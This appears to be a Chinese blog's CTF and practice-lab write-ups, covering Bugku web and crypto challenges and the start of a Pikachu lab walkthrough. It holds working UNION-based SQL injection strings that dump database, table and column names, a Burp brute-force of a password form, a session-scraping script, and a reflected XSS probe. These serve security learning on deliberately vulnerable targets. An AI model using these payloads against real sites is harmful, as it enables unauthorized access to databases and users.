class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> p1 = <span class="hljs-string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;<br><span class="hljs-keyword">var</span> p2 = <span class="hljs-string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;<br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">unescape</span>(p1) + <span class="hljs-built_in">unescape</span>(<span class="hljs-string">&#x27;%35%34%61%61%32&#x27;</span> + p2));<br></code></pre></td></tr></table></figure><p>unescape()函数可以对字符串进行解码。</p><p>解码后如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">p1=<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkSubmit</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> a=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;undefined&quot;</span>!=<span class="hljs-keyword">typeof</span> a)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;67d709b2b</span><br><span class="hljs-string"></span><br><span class="hljs-string">p2=aa648cf6e87a7114f1&quot;</span>==a.<span class="hljs-property">value</span>)<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Error&quot;</span>);a.<span class="hljs-title function_">focus</span>();<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;&#125;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;levelQuest&quot;</span>).<span class="hljs-property">onsubmit</span>=checkSubmit;<br><br>拼接字符=54aa2<br><br>按要求拼接后为：<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkSubmit</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> a=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;undefined&quot;</span>!=<span class="hljs-keyword">typeof</span> a)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.<span class="hljs-property">value</span>)<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Error&quot;</span>);a.<span class="hljs-title function_">focus</span>();<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;&#125;<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;levelQuest&quot;</span>).<span class="hljs-property">onsubmit</span>=checkSubmit;<br></code></pre></td></tr></table></figure><p>直接将if中的<code>67d709b2b54aa2aa648cf6e87a7114f1</code>放入提交框提交，即可得到flag。</p><h2 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-14%20%E4%B8%8A%E5%8D%8812.29.13.png" alt="截屏2023-10-14 上午12.29.13" style="zoom: 50%;" /><p>一个提交框，提示输入5位密码。</p><p>随意输入密码后，回显密码不正确，请重新输入。</p><p>F12查看源码后，得知是post表单提交密码。</p><p>直接尝试bp抓包爆破密码（设置范围为10000-99999，很多、所以要等一会儿），爆出密码为12468。</p><p>得到flag{26f0064b2a9d5f80982933730d19f0b0}</p><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-14%20%E4%B8%8A%E5%8D%882.18.25.png" alt="截屏2023-10-14 上午2.18.25" style="zoom:33%;" /><p>输入信息，查询数据库后回显。</p><p>很明显是要用sql注入，按流程走一遍吧。</p><p>先查看注入类型。</p><p><code>1&#39; and &#39;1&#39;=&#39;1&#39;#</code>正常回显，<code>1&#39; and &#39;1&#39;=&#39;2&#39;#</code>无回显，所以是字符型注入。</p><p>查询字段长度，<code>1&#39; order by 5#</code>无回显，所以字段长度为5.</p><p>确定回显位置，<code>-1&#39; union select 1,2,3,4#</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-14%20%E4%B8%8A%E5%8D%882.30.54.png" alt="截屏2023-10-14 上午2.30.54"></p><p>接下来就是查库查表查字段了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查库名<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3,database()# ——得到库名：skctf</span><br><span class="hljs-string"></span><br><span class="hljs-string">#查表名</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;skctf&#x27;</span>#  ——得到表名：fl4g,sc<br><br>#查列名<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>fl4g<span class="hljs-string">&#x27;# ——获得列名：skctf_flag</span><br><span class="hljs-string"></span><br><span class="hljs-string">#查看数据</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,skctf_flag <span class="hljs-keyword">from</span> fl4g#  ——获得flag<br></code></pre></td></tr></table></figure><p>得到flag{4b947eca1cbb6b4dd9179bd6ef7c30b1}</p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>页面就一句话：我感觉你得快点!!!</p><p>查看源代码，获得一条新提示：OK ,now you have to post the margin what you find</p><p>post the margin？啥意思。</p><p>bp抓包，send后在Response的Header里发现了flag：6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT1RNM01EZzI&#x3D;</p><p>看格式是base64，丢去[解码][12].</p><p>得到：<strong>跑的还不错，给你flag吧: OTM3MDg2</strong></p><p>再次解码，得到一串数字：937086</p><p>将这串数字赋值给margin进行提交，结果显示：我都说了让你快点。。。</p><p>又多尝试了几次，发现flag是会变动的值。</p><p>百度之后才得知，原来是要在同一session下才能成功。</p><p>那只能写脚本获取session，然后抓取flag值解码后提交了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br>s = requests.session() <br>url = <span class="hljs-string">&#x27;http://114.67.175.224:18857/&#x27;</span><br>head = s.get(url).headers<br>flag = base64.b64decode(head[<span class="hljs-string">&#x27;flag&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>flag = re.search(<span class="hljs-string">&#x27;(?&lt;=[:]\s).*&#x27;</span>,flag).group(<span class="hljs-number">0</span>)<br>flag = base64.b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>margin = &#123;<span class="hljs-string">&#x27;margin&#x27;</span>: flag&#125;<br><span class="hljs-built_in">print</span>(s.post(url,data=margin).text)<br><br></code></pre></td></tr></table></figure><p>获得flag。</p><h1 id="【Crypto】"><a href="#【Crypto】" class="headerlink" title="【Crypto】"></a>【Crypto】</h1><h2 id="【涉及密码总结】"><a href="#【涉及密码总结】" class="headerlink" title="【涉及密码总结】"></a>【涉及密码总结】</h2><p>摩斯密码、Ook和BrainFuck、栅栏密码、猪圈密码、棋盘密码、希尔密码、气泡密码</p><h2 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h2><blockquote><p>老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p></blockquote><p>很离谱，又是眼神不好又是强迫症要换小写的。</p><p>抄下来的字符：QWIHBLGZZXJSXZNVBZW</p><p>全换成小写：qwihblgzzxjsxznvbzw</p><p>数字里能抄错成字母的，大概也就 1-I、2-z、5-s、6-b、9-q。</p><p>估摸着是Base64，四个为一组的测试解码。</p><p>第一组：【QW1H】AmG、【QW1h】Ama</p><h2 id="x2F"><a href="#x2F" class="headerlink" title="&#x2F;.-"></a>&#x2F;.-</h2><blockquote><p>..-.&#x2F;.-..&#x2F;.-&#x2F;–.&#x2F;—-.–&#x2F;-..&#x2F;…–&#x2F;..-.&#x2F;-.-.&#x2F;-…&#x2F;..-.&#x2F;.—-&#x2F;–…&#x2F;..-.&#x2F;—-.&#x2F;…–&#x2F;—-.&#x2F;—-.&#x2F;…..&#x2F;—–&#x2F;….-&#x2F;—–.-</p></blockquote><p>乍一看这种点线组合就知道是摩斯密码。</p><p>使用解码器解码即可获得flag。</p><h3 id="【摩斯密码表】"><a href="#【摩斯密码表】" class="headerlink" title="【摩斯密码表】"></a>【摩斯密码表】</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-06%20%E4%B8%8B%E5%8D%883.19.40.png" alt="截屏2023-10-06 下午3.19.40" style="zoom:33%;" /><h2 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h2><blockquote><p>一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p></blockquote><p>提示很明显了，栅栏密码且栏目数为2。</p><p>直接解码即可获得flag。</p><h3 id="【栅栏密码】"><a href="#【栅栏密码】" class="headerlink" title="【栅栏密码】"></a>【栅栏密码】</h3><p>栅栏密码就是把要加密的明文分为n个一组，然后把每组的第一个字连起来，形成一句无规律的话。</p><p>例如iloveyou以两个栅栏数加密，得到的结果为ioeolvyu。</p><p><em>i-o-e-o-l-v-y-u</em></p><h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><blockquote><p>Ook. </p></blockquote><p>把附件下载下来，发现里面全是ook这三个字符。</p><blockquote><p>节选部分：</p><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</p></blockquote><p>Ook.是一种奇特的编程语言，只有Ook. Ook? Ook! 三种格式。</p><p>丢去专门的网站解码即可。</p><h2 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h2><blockquote><p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— —– —.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- —– &lt;]&gt;– —– -.–. —-. –.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; —– -&lt;]&gt;- —– —-. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. —-. ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;—- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</p></blockquote><p>和上一题ok类似，也是一种特殊的编程语言，名为Brainfuck（简称bf）。</p><p>特征是使用<code>&gt;+&lt;+++-+.+,+[+]</code>八种符号来替换C语言中的语法和命令。</p><p>同样丢去专门的网站解码即可。</p><p><strong>Ook和Brainfuck的解码网站：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></strong></p><h2 id="把猪困在猪圈里"><a href="#把猪困在猪圈里" class="headerlink" title="把猪困在猪圈里"></a>把猪困在猪圈里</h2><p>看题目一下子想到[猪圈密码][6]。</p><p>猪圈密码是以图片的形式存在。</p><p>打开附件后，发现里面的字符内容乱七八糟，还带着一部分重复，但结尾带了一个&#x3D;号。应该是Base64 DataUrl。</p><p>DataUrl是一种巧妙将图片嵌入html的方式，且能优化网页的加载速度和执行效率。在Data URL协议中，图⽚被转换成base64编码的字符串形式，并存储在URL中，冠以mime-type。</p><p>在文件头加上<code>data:image/jpeg;base64</code>后（Dataurl的格式），丢进[base64图片转换网站][11]进行转换。</p><p>转换结果如下：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-06%20%E4%B8%8B%E5%8D%883.53.28.png" alt="截屏2023-10-06 下午3.53.28" style="zoom:33%;" /><p>再对猪圈密码进行解码（<a href="http://mmoersima.00cha.net/zhuquan.asp">解码网站</a>），解码后得到flag。</p><h2 id="你喜欢下棋吗"><a href="#你喜欢下棋吗" class="headerlink" title="你喜欢下棋吗"></a>你喜欢下棋吗</h2><blockquote><p>你喜欢下棋吗？<br>解压密码为小写<br>4423244324433534315412244543</p><p>描述:密码全为小写，格式bugku{}</p></blockquote><p>去搜索了一下下棋相关的密码，找到了棋盘密码。</p><p>棋盘密码是利用<strong>波利比奥斯方阵</strong>(Polybius Square)进行加密的加密方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/0zF6aR.png" alt="Polybius校验表"></p><p>文件里的写着解压密码为4423244324433534315412244543。解码得到：thisispolybius。</p><p>解压文件后，得到新的提示。</p><blockquote><p>一种5bit的编码<br>bugku里面的内容为小写<br>bugku{11111 11001 00011 00111 01001 11011 10110 11111 10000 01110 11011 10110 11111 01001 00001}</p></blockquote><p>已经写上是5bit编码了。</p><blockquote><p>博多电码是法国工程师博多于1874年取得专利的一种电报码，在20世纪中期取代了莫尔斯电码。</p><p>来自：百度百科</p></blockquote><p>博多码是由5个长度相同的”通“、”断“信号组成的电码，一共有32中组合。现代的博多码延伸到7、8个信号组成。</p><img src="https://img.by24.cn/picgo/20200302133420.png" alt="https://img.by24.cn/picgo/20200302133420.png" style="zoom: 33%;" /><p>在线解码网站：<a href="https://www.boxentriq.com/code-breaking/baudot-code">https://www.boxentriq.com/code-breaking/baudot-code</a></p><p>解码得到BAUD0TC0DE，直接提交提示错误，转成小写后成功。</p><h3 id="【棋盘密码特征】"><a href="#【棋盘密码特征】" class="headerlink" title="【棋盘密码特征】"></a>【棋盘密码特征】</h3><p>（[在线解码][7]）</p><p> <strong>波利比奥斯棋盘</strong></p><ul><li>明文只能是字母；</li><li><strong>密文全部为数字</strong>；</li><li>密文长度是明文的两倍，即偶数；</li><li>明文字母I和J的密文编码相同，解密后需人工确认。</li></ul><p><strong>ADFGX棋盘密码</strong></p><ul><li>明文只能是字母；</li><li><strong>密文只会是字母</strong>：ADFGX；</li><li>密文长度是明文的两倍，即偶数；</li><li>明文字母I和J的密文编码相同，解密后需人工确认。</li></ul><p><strong>ADFGVX棋盘密码</strong></p><ul><li><strong>明文只能是字母和数字</strong>；</li><li>密文只会是字母：ADFGVX；</li><li>密文长度是明文的两倍，即偶数。</li></ul><h2 id="小山丘的秘密"><a href="#小山丘的秘密" class="headerlink" title="小山丘的秘密"></a>小山丘的秘密</h2><blockquote><p>hill能有什么秘密呢</p></blockquote><p>解压包里有一张棋盘图片和一个txt。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-07%20%E4%B8%8B%E5%8D%8812.55.13.png" alt="" style="zoom:50%;" /><blockquote><p>bugku{PLGTGBQHM}</p><p>其中A&#x3D;1，flag全为小写</p></blockquote><p>希尔密码的英文全称是Hill Cipher，是运用基本矩阵论原理的替换密码，每个字母当作26进制数字：A&#x3D;0, B&#x3D;1, C&#x3D;2…  一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果mod26。用作加密的矩阵（即密匙）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。</p><p>具体可以参考这一篇文章：[Hill 密码][10]</p><p>hill密码的在线加密解密：<a href="http://www.atoolbox.net/Tool.php?Id=914">http://www.atoolbox.net/Tool.php?Id=914</a></p><p>提示写着A&#x3D;1，那么B就是2，Z就是0。字母表为zabcdefghijklmnopqrstuvwxy</p><p>通过棋盘图片推测出矩阵秘钥为:</p><p>[1 2 3</p><p> 0 1 4</p><p> 5 6 0]</p><p>推测出密钥为：abczadefz</p><p>对plgtgbqhm进行解密后得到flag：whatahill</p><h2 id="EN-气泡"><a href="#EN-气泡" class="headerlink" title="EN-气泡"></a>EN-气泡</h2><blockquote><p>xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux</p></blockquote><p>五个为一组，开头结尾都为x</p><p>乍一看没啥思路，一搜发现这种密码就叫Bubble_Babble，特点是开头结尾有个’x’</p><p>丢进[解码工具][9]里，解码三次获得flag。</p><h2 id="你以为是md5吗"><a href="#你以为是md5吗" class="headerlink" title="你以为是md5吗"></a>你以为是md5吗</h2><blockquote><p>bci177a7a9c7udf69c248647b4dfc6fd84o</p><p>提示：md5的构成</p></blockquote><p>乍一看觉得是md5，但自已一看构成发现包含了字母o。</p><p>md5的构成是1-9的数字和a-f的字母。</p><p>把超过范围的字母去除，得bc177a7a9c7df69c248647b4dfc6fd84</p><p>再进行[解密][8]，获得flag。</p><h1 id="【MISC杂项】"><a href="#【MISC杂项】" class="headerlink" title="【MISC杂项】"></a>【MISC杂项】</h1><h1 id="参考-amp-引用"><a href="#参考-amp-引用" class="headerlink" title="参考&amp;引用"></a>参考&amp;引用</h1><p>[1]: <a href="https://cloud.tencent.com/developer/article/2124510">https://cloud.tencent.com/developer/article/2124510</a>“关于flask的SSTI注入[通俗易懂]”</p><p>[2]: <a href="https://www.freebuf.com/sectool/246832.html">https://www.freebuf.com/sectool/246832.html</a>“细说服务器端模板注入（SSTI）”<br>[3]: <a href="https://blog.csdn.net/Manuffer/article/details/120739989">https://blog.csdn.net/Manuffer/article/details/120739989</a>“SSTI模板注入总结”<br>[4]: <a href="https://zhuanlan.zhihu.com/p/457401377">https://zhuanlan.zhihu.com/p/457401377</a>“CTF&amp;爬虫：掌握这些特征，一秒识别密文加密方式”<br>[5]: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For</a>“MDN Web Docs - X-Forwarded-For”<br>[6]: <a href="https://baike.baidu.com/item/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81/5538711?fr=ge_ala">https://baike.baidu.com/item/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81/5538711?fr=ge_ala</a>“百度百科-猪圈密码”<br>[7]: <a href="https://www.qqxiuzi.cn/bianma/qipanmima.php">https://www.qqxiuzi.cn/bianma/qipanmima.php</a>“棋盘密码加密解密”<br>[8]: <a href="https://www.somd5.com/">https://www.somd5.com/</a>“md5解码”<br>[9]: <a href="http://www.hiencode.com/bubble.html">http://www.hiencode.com/bubble.html</a>“BubbleBabble解码”<br>[10]: <a href="https://www.cnblogs.com/kentle/p/15023521.html">https://www.cnblogs.com/kentle/p/15023521.html</a>“Hill 密码”<br>[11]: <a href="https://tool.chinaz.com/tools/imgtobase/">https://tool.chinaz.com/tools/imgtobase/</a>“Base64图片转换”<br>[12]: <a href="https://base64.us/">https://base64.us/</a>“base64在线解码”</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pikachu靶场+分析</title>
    <link href="/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <url>/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><ol><li>反射性XSS</li><li>存储型XSS</li><li>DOM型XSS</li></ol><blockquote><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP  TOP10的排名中一直属于前三的江湖地位。</p><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p><p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“对输出进行转义”的方式进行处理。</p></blockquote><p>实验前先把项目里的pkxss拷贝放进搭建环境根目录（例如使用phpstudy，pkxss放进www文件）。</p><p>新开标签页，打开后台<a href="http://localhost/pkxss/pkxss_login.php%E3%80%82">http://localhost/pkxss/pkxss_login.php。</a></p><p>登陆后发现内含3个模块。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230402121825372.png" alt="image-20230402121825372" style="zoom:50%;" /><h2 id="1-反射型xss-get、post"><a href="#1-反射型xss-get、post" class="headerlink" title="1.反射型xss(get、post)"></a>1.反射型xss(get、post)</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328205420022.png" alt="image-20230328205420022" style="zoom:50%;" /><p>输入框输入名字。提交空，提示输入kobe。输入kebe显示图片，输入其他显示who is xxx。</p><p>尝试提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现输入长度做了限制。</p><p>直接F12修改maxlength属性。</p><p>重新输入payload，成功弹出1.</p><h2 id="2-存储型xss"><a href="#2-存储型xss" class="headerlink" title="2.存储型xss"></a>2.存储型xss</h2><h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><h2 id="1-数字型注入（post）"><a href="#1-数字型注入（post）" class="headerlink" title="1.数字型注入（post）"></a>1.数字型注入（post）</h2><p>这题是post类型（数据放在Request body中），数据需要使用bp进行抓取。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230325234741021.png" alt="image-20230325234741021"></p><p>可以选择id进行查询，通过试验，不同的id会导致回显的用户名及邮箱不同。</p><p>猜测通过id在数据库查找用户名。</p><p>bp抓包后测试<code>id=1 or 1 = 1</code>，结果显示出所有的用户名。</p><p>（解释，假设查询语句为<code>select username from member where id=_</code>,也就是通过id值进行查找，这时候如果将where的条件改为<code>id=1 or 1 = 1</code>，因为1&#x3D;1为真，这句话的效果就等同于<code>select username from member</code>）.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326000103330.png" alt="image-20230326000103330" style="zoom: 50%;" /><p>这个测试意味着输入没有做限制，可以进行注入。</p><p>此时可以使用联合查询获取信息。</p><p>联合查询必须拥有相同的列（否则会报错），所以需要使用<code>order by</code>来判断列数。</p><p><code>order by</code>可指定列进行排序，可通过指定的列是否存在来判断列的个数。</p><p>该例子里，当试验到<code>id=1 order by 3</code>时，页面回显报错。意味着列的个数为2。</p><p>通过列的格式来进行查询，例如：<code>id=1 union select 1,database()</code></p><p>回显出了数据库的名字（其他的信息也同理查询）。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230326005545266.png" alt="image-20230326005545266" style="zoom:50%;" /><blockquote><p>mysql 5.0以上版本自带数据库，information_schema记录有当前mysql下所有数据库名，表名，列名信息。下列是存放各信息的名字</p><p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p></blockquote><p>一些查询语句（mysql5）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 数据库</span><br><span class="hljs-keyword">select</span> database()  <span class="hljs-comment">-- 获得数据库名pikachu</span><br><br><span class="hljs-comment">-- 表名</span><br><span class="hljs-comment">-- group_concat()，将多个字符串连在一起，这样可以使格式不出问题</span><br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(table_name)               <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><span class="hljs-operator">|</span> httpinfo,<span class="hljs-keyword">member</span>,message,users,xssblind <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------+</span><br><br><span class="hljs-comment">-- 列名（此处举例查users表）</span><br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> group_concat(column_name)                                             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------------------+</span><br><br><span class="hljs-comment">-- 数据（此处举例查username,password[注意格式]）</span><br><span 